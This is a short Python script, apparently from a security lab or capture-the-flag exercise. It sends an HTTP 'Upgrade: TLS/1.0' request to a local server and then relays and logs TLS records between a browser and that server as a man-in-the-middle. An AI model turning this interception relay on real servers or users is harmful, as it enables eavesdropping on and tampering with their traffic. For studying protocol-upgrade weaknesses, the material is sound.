#!/usr/bin/env python3
from pwn import * 
from scapy.layers.tls.all import TLS


context.log_level = 'info'

LPORT = 1234
RHOST = 'localhost'
RPORT = 8003
RPORT_TLS = 443


l = listen(LPORT)
l.wait_for_connection()

r = remote(RHOST, RPORT)

upgrade_request = (
        'GET /server_version.xsl HTTP/1.1\r\n'
        'Host: localhost\r\n'
        'User-Agent: AttackerScript\r\n'
        'Upgrade: TLS/1.0\r\n'
        'Connection: Upgrade\r\n'
        '\r\n'
    ).encode()

r.send(upgrade_request)
upgrade_response = r.recv()
print(upgrade_response.decode())
assert('101 Switching Protocols' in upgrade_response.decode())



# connect both sides 
def forward(src, dest, label):
    while True:
        try:
            data = src.recv()
            log.info(f'From {label} got {TLS(data).summary()}')
            dest.send(data)
        except Exception as e:
            print(e)
            break
        
t1 = Thread(target=forward, args=(l, r, 'Browser'))
t2 = Thread(target=forward, args=(r, l, 'Server'))

t1.start()
t2.start()








